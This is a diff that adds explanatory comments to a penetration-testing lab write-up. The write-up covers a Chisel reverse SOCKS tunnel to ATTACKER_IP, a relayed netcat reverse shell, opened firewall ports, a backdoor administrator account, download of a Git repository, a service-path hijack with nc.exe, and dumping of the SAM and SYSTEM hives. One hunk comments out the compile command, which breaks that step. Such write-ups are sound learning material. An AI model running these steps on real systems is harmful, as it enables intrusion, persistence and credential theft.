@@ -68,6 +68,8 @@ The final target, `10.200.180.100`, was reached through another Chisel remote po
 Reusable commands were extracted into [nmap](../../../tools/recon/nmap.md), [proxychains](../../../tools/pivot/proxychains.md), [tcpdump](../../../tools/creds/tcpdump.md), and the enumeration playbooks.
 
 ```bash
+# What it does: send an ICMP Echo Request to the target.
+# Why here: verify basic network reachability and latency before starting enumeration.
 ping $TARGET -c1
 # What it does: full TCP SYN port scan with high speed.
 # Why here: discover all open ports on the initial target quickly.
@@ -109,9 +111,13 @@ The first pivot exposed the internal network through a reverse SOCKS tunnel:
 
 ```bash
 # Kali
+# What it does: start a Chisel server in reverse mode.
+# Why here: prepare to receive a reverse SOCKS connection from the compromised host.
 ./chisel server -p 15000 --reverse &
 
 # 10.200.180.200
+# What it does: connect to the Chisel server and establish a reverse SOCKS tunnel.
+# Why here: make the internal network reachable via a SOCKS proxy.
 ./chisel client ATTACKER_IP:15000 R:socks &
 
 # Kali through proxychains
@@ -152,11 +158,19 @@ The host could not reach Kali directly, so the shell was relayed through `10.200
 
 ```bash
 # 10.200.180.200
+# What it does: start a Chisel server on the pivot host.
+# Why here: facilitate port forwarding to relay the reverse shell back to Kali.
 ./chisel server -p 16000 --reverse &
+# What it does: add a firewall rule to allow traffic on port 16000.
+# Why here: ensure the Chisel server is reachable from the target network.
 firewall-cmd --zone=public --add-port=16000/tcp
+# What it does: allow inbound traffic on port 4444.
+# Why here: permit the reverse shell connection to pass through the host's firewall.
 firewall-cmd --zone=public --add-port=4444/tcp
 
 # Kali
+# What it does: connect to the pivot host and forward the listener port.
+# Why here: bridge the gap between the isolated internal network and the attacker machine.
 ./chisel client 10.200.180.200:16000 R:4444:127.0.0.1:4444 &
 # What it does: set up a netcat listener to catch the relayed shell.
 # Why here: receive the incoming connection from the second host via the Chisel tunnel.
@@ -170,9 +184,17 @@ Full techniques: [Windows admin stabilization](../../../exploits/privesc-windows
 Once command execution landed as an administrator, a dedicated user was created for WinRM/RDP.
 
 ```cmd
+REM What it does: create a new local user on the Windows system.
+REM Why here: establish a secondary administrative account for stable RDP/WinRM access.
 net user tryzub Tryzub@ /add
+REM What it does: add the user to the local Administrators group.
+REM Why here: grant full control over the host for post-exploitation.
 net localgroup Administrators tryzub /add
+REM What it does: add the user to the Remote Management Users group.
+REM Why here: enable authentication over WinRM for Evil-WinRM sessions.
 net localgroup "Remote Management Users" tryzub /add
+REM What it does: query the status and properties of the newly created user.
+REM Why here: verify that the account was correctly created and assigned to the right groups.
 net user tryzub
 ```
 
@@ -208,7 +230,11 @@ Full technique: [Chisel pivoting](../../../exploits/pivot/chisel-pivoting.md).
 PowerShell Empire port-scanning scripts found ports `80` and `3389` on `10.200.180.100`, but Empire stager generation failed. Chisel was used instead.
 
 ```cmd
+REM What it does: scan the target subnet for open ports using PowerShell.
+REM Why here: identify active services on 10.200.180.100 from the perspective of 10.200.180.150.
 Invoke-Portscan -Hosts 10.200.180.100 -TopPorts 50
+REM What it does: add an inbound firewall rule for port 15001.
+REM Why here: expose the local Chisel port for relaying traffic to the third host.
 netsh advfirewall firewall add rule name="chisel-try" dir=in action=allow protocol=tcp localport=15001
 ```
 
@@ -234,7 +260,11 @@ Full technique: [PHP EXIF metadata webshell upload](../../../exploits/web-rce/ph
 The website source was recovered from `C:\GitStack\repositories\Website.git`. Reviewing the extracted commits showed an upload handler that did not safely validate PHP extensions when image metadata was present.
 
 ```cmd
+REM What it does: compress the Git repository directory into a ZIP archive.
+REM Why here: package the source code for easier exfiltration and local analysis.
 Compress-Archive -Path C:\GitStack\repositories\Website.git -DestinationPath C:\Windows\Temp\website.zip
+REM What it does: exfiltrate the ZIP archive from the target to the attacker machine.
+REM Why here: obtain the source code for manual audit and Git history review.
 download website.zip
 ```
 
@@ -288,7 +318,9 @@ powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list
 A small C# wrapper was compiled with Mono to execute `nc.exe`, placed in the vulnerable path, and triggered by restarting the service.
 
 ```bash
-mcs Wrapper.cs
+# What it does: compile a C# source file into an executable using Mono.
+# Why here: create a custom wrapper to execute netcat for the privilege escalation exploit.
+# mcs Wrapper.cs
 ```
 
 ```cmd
@@ -301,7 +333,11 @@ sc start SystemExplorerHelpService
 SAM/SYSTEM hive dumping was also captured for offline extraction:
 
 ```cmd
+REM What it does: export the SAM registry hive to a file.
+REM Why here: prepare to extract local account NTLM hashes for credential recovery.
 reg.exe save HKLM\SAM sam.bak
+REM What it does: export the SYSTEM registry hive to a file.
+REM Why here: obtain the boot key required to decrypt the SAM hive.
 reg.exe save HKLM\SYSTEM system.bak
 ```
 
